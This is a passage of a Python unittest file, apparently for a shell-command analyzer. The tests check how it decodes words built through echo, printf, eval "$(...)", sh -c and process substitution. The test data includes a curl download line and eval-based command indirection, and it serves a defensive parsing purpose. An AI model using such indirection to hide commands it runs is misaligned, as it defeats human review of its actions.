            self.assertEqual([1, 1], [len(texts(differ, wp.ANY)), len(texts(alike, None))])

    def test_a_word_the_reader_spelled_is_read_as_spelled(self):
        class Spelled(str):
            spelled = "curl"

        words = self.argv("printf '%s -o t %s" + N + "' x '$U'")
        self.assertEqual(["x -o t $U\n"], wp._apart(words, None))
        self.assertEqual(["curl -o t $U\n"], wp._apart(words[:2] + [Spelled("$C")] + words[3:], None))

    def test_zsh_has_a_row_of_its_own_and_every_familys_escapes(self):
        # `_ECHO` has zsh's options and its decoding; no `_WRITERS` row is measured for it, so all four read.
        self.assertEqual(["$X"], wp._apart(self.argv("echo -n -e '$X'"), "zsh"))
        self.assertEqual(["$Xc"], wp._apart(self.argv("echo '$X" + B + "x63'"), "zsh"))     # dash's text is `main`'s
        self.assertEqual(["c$X", B + "x63$X"], wp._apart(self.argv("printf '" + B + "x63%s' '$X'"), "zsh"))

    def test_the_one_printer_a_program_word_is(self):
        def word(line):
            return self.argv(line)[-1]

        self.assertEqual(["$X y"], wp.worded(word('eval "$(echo \'$X y\')"')))
        self.assertEqual(["%s\\n $X", "$X\n"], wp.worded(word('sh -c "$(printf \'%s\\n\' \'$X\')"')))
        self.assertEqual(["-n $X", "$X"], wp.worded(word('eval "$(echo -n \'$X\')"')))
        self.assertEqual([], wp.worded(word('eval "$(echo plain)"')))                  # spelled: read as the program
        self.assertEqual([], wp.worded(word('eval "$(echo \'$X\'; true)"')))           # not one printer
        self.assertEqual([], wp.worded(word('eval "x $(echo \'$X\')"')))               # not ALL one `$(...)`
        self.assertEqual([], wp.worded(word("sh <(echo '$X')")))                        # a file, `unprinted`'s
        self.assertEqual([], wp.worded("$X"))
        with wo.mains_answer():
            self.assertEqual([], wp.worded(word('eval "$(echo \'$X y\')"')))


if __name__ == "__main__":
    unittest.main()
